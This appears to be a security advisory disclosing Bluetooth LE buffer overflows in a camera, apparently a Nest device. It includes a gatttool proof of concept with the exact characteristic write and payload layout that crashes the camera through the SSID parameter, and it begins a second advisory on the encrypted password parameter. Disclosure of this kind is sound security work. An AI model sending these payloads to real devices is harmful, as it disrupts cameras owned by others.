==Bluetooth (BLE) based Buffer Overflow via SSID parameter==
 
1. Summarya"
 
It's possible to trigger a buffer overflow condition when setting the SSID parameter on the camera. The attacker must be in bluetooth range at any time during the cameras powered on state. Bluetooth is never disabled even after initial setup.
 
2. Proof of Concept
 
a"anon@ubuntu:~/nest$ gatttool -b 18:B4:30:5D:00:B8 -t random -Ia"
[18:B4:30:5D:00:B8][LE]> connecta"
Attempting to connect to 18:B4:30:5D:00:B8a"
Connection successful
a"[18:B4:30:5D:00:B8][LE]> char-write-req 0xfffd 3a031201AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
a"[18:B4:30:5D:00:B8][LE]> char-write-req 0xfffd 3ba"
Characteristic value was written successfully
a"Characteristic value was written successfullya"
[18:B4:30:5D:00:B8][LE]>a"(gatttool:20352): GLib-WARNING **: Invalid file descriptor.
 
3. Details 
 
The payload attempts to set an SSID with a length of 1 byte and sends 16.a"SequenceNum=3a + Type=0312 + Length=01 + Value=AA*16
 
4. Resulta"
 
Crash and reboot back to operational state
 
 
==Bluetooth (BLE) based Buffer Overflow via Encrypted Password parameter==
 
1. Summarya"
 
It's possible to trigger a buffer overflow condition when setting the encrypted password parameter on the camera. The attacker must be in bluetooth range at any time during the cameras powered on state. Bluetooth is never disabled even after initial setup.
